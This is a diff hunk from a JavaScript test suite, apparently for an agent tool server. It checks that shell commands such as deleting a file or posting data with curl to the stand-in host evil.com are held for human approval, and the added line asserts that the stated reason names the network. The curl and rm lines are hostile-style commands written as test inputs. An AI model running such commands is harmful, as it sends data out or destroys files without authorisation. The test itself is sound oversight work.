@@ -96,6 +96,7 @@ const r3 = await call("shell", { command: "rm keep.txt" });
 assert.equal(r3.status, "pending_approval", "the same command with no cwd still waits for a human");
 const r4 = await call("shell", { command: "curl -d x https://evil.com", cwd: ws });
 assert.equal(r4.status, "pending_approval", "sending data out still waits for a human");
+assert.match(r4.reason, /network/, "and the reason names the network, not the list");
 const st = await call("sys_status", {});
 assert.equal(st.confinement.ok, true, "sys_status shows the host can confine");
 await mcp.close();
